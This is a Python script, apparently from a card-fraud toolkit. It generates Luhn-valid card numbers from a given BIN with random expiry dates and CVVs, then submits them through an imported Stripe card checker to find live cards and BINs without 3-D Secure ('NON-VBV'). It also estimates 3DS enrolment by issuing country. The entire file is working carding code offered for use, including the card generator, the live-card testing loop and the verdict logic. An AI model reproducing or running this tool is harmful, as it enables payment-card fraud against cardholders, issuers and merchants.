import asyncio
import random
import sys
from stripe_checker import StripeChecker
from bin_info import fetch_bin_info, format_bin_block

SCA_COUNTRIES = {
    "AT", "BE", "BG", "HR", "CY", "CZ", "DK", "EE", "FI", "FR",
    "DE", "GR", "HU", "IS", "IE", "IT", "LV", "LI", "LT", "LU",
    "MT", "NL", "NO", "PL", "PT", "RO", "SK", "SI", "ES", "SE",
    "GB", "CH",
}

VBV_LIKELY_COUNTRIES = {
    "AU", "CA", "IN", "JP", "KR", "SG", "MY", "TH", "BR", "MX",
    "ZA", "NZ", "AE", "SA", "RU", "TR", "AR", "CL", "CO", "PE",
    "TW", "HK", "PH", "ID", "VN", "NG",
}


def luhn_checkdigit(partial: str) -> str:
    digits = [int(d) for d in partial]
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 0:
            d2 = d * 2
            total += d2 - 9 if d2 > 9 else d2
        else:
            total += d
    return str((10 - (total % 10)) % 10)


def generate_cards(bin6: str, count: int = 5) -> list:
    cards = []
    seen = set()
    while len(cards) < count:
        rand_digits = "".join(random.choices("0123456789", k=16 - len(bin6) - 1))
        partial = bin6 + rand_digits
        full = partial + luhn_checkdigit(partial)
        if full not in seen:
            seen.add(full)
            mm = str(random.randint(1, 12)).zfill(2)
            yy = str(random.randint(2026, 2030))
            cvv = "".join(random.choices("0123456789", k=3))
            cards.append((full, mm, yy, cvv))
    return cards


def estimate_vbv(country: str, brand: str, funding: str) -> str:
    country = (country or "").upper().strip()
    brand = (brand or "").upper().strip()
    funding = (funding or "").lower().strip()

    if country in SCA_COUNTRIES:
        return "VBV (SCA mandated)"

    if country in VBV_LIKELY_COUNTRIES:
        return "LIKELY VBV"

    if brand in ("VISA", "MASTERCARD") and country == "US":
        if funding == "prepaid":
            return "LIKELY NON-VBV"
        return "POSSIBLY VBV"

    if brand in ("AMEX",):
        return "SAFEKEY (AMEX 3DS)"

    if not country:
        return "UNKNOWN"

    return "UNKNOWN"


async def check_vbv(bin6: str, count: int = 5):
    bin6 = bin6.strip()[:8]
    if not bin6.isdigit() or len(bin6) < 6:
        print(f"Invalid BIN: {bin6}")
        return

    print(f"{'='*55}")
    print(f"  VBV/3DS Check for BIN: {bin6}")
    print(f"{'='*55}\n")

    info = await fetch_bin_info(bin6[:6])
    brand = "?"
    funding = "?"
    country = "?"
    bank = None

    if info and not info.get("_error"):
        brand = info.get("scheme") or info.get("brand") or "?"
        funding = info.get("type") or "?"
        country = info.get("country_alpha2") or "?"
        bank = info.get("bank_name") or None
        product = info.get("product_type") or "unknown"

        vbv_est = estimate_vbv(country, brand, funding)

        extra = []
        for key, label in [("prepaid", "Prepaid"), ("debit", "Debit"), ("commercial", "Commercial")]:
            val = info.get(key, "")
            if val:
                extra.append(f"{label}={val}")
        flag_line = [f"Flags:   {', '.join(extra)}"] if extra else []
        flag_line.append(f"VBV Est: {vbv_est}")

        block = format_bin_block(
            brand=brand, funding=funding, country=country,
            three_ds=product, checks="all None", bank=bank,
            extra_lines=flag_line,
        )
        print(block)
        print()
    else:
        print(f"BIN lookup returned no data\n")
        vbv_est = "UNKNOWN"

    cards = generate_cards(bin6[:6], count)
    checker = StripeChecker()

    vbv_count = 0
    non_vbv_count = 0
    error_count = 0
    declined_count = 0
    results = []

    print(f"Checking {len(cards)} generated cards...\n")

    for i, (cc, mm, yy, cvv) in enumerate(cards, 1):
        status, msg = await checker.check_card(cc, mm, yy, cvv)

        if status == "APPROVED":
            if "3DS" in msg or "Authentication" in msg:
                vbv_count += 1
                tag = "VBV"
            else:
                non_vbv_count += 1
                tag = "NON-VBV"
        elif status == "CCN":
            non_vbv_count += 1
            tag = "NON-VBV (CVV Live)"
        elif status == "INSUFFICIENT":
            non_vbv_count += 1
            tag = "NON-VBV (Live)"
        elif status == "CHARGED":
            non_vbv_count += 1
            tag = "NON-VBV (Charged)"
        elif status == "DECLINED":
            declined_count += 1
            tag = "DECLINED"
        else:
            error_count += 1
            tag = "ERROR"

        print(f"  [{i}/{len(cards)}] {cc[:6]}***{cc[-4:]} | {mm}/{yy} | [{tag}] {msg}")
        results.append((cc, status, msg, tag))

        if i < len(cards):
            await asyncio.sleep(1.5)

    print(f"\n{'='*55}")
    print(f"  RESULTS for BIN {bin6}")
    print(f"{'='*55}")
    print(f"  VBV/3DS:    {vbv_count}")
    print(f"  Non-VBV:    {non_vbv_count}")
    print(f"  Declined:   {declined_count}")
    print(f"  Errors:     {error_count}")
    print(f"  Total:      {len(cards)}")

    if vbv_count > 0 and non_vbv_count == 0:
        verdict = f"BIN {bin6} is VBV (3DS enrolled)"
    elif non_vbv_count > 0 and vbv_count == 0:
        verdict = f"BIN {bin6} is NON-VBV"
    elif vbv_count > 0 and non_vbv_count > 0:
        verdict = f"BIN {bin6} is MIXED ({vbv_count} VBV, {non_vbv_count} non-VBV)"
    else:
        if country in SCA_COUNTRIES:
            verdict = f"BIN {bin6} — Estimated VBV (SCA country: {country})"
        elif country in VBV_LIKELY_COUNTRIES:
            verdict = f"BIN {bin6} — Estimated LIKELY VBV ({country})"
        elif funding == "prepaid" and country == "US":
            verdict = f"BIN {bin6} — Estimated LIKELY NON-VBV (US prepaid)"
        else:
            verdict = f"BIN {bin6} — VBV status undetermined (use real cards)"

    print(f"\n  >> {verdict}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python test.py <BIN> [count]")
        print("  BIN: 6-8 digit BIN number")
        print("  count: number of cards to generate (default 5)")
        print()
        print("Examples:")
        print("  python test.py 454676 5     # check 5 generated cards")
        print("  python test.py 476136 3     # check 3 generated cards (UK BIN)")
        sys.exit(1)

    bin_input = sys.argv[1].strip()
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 5

    asyncio.run(check_vbv(bin_input, count))
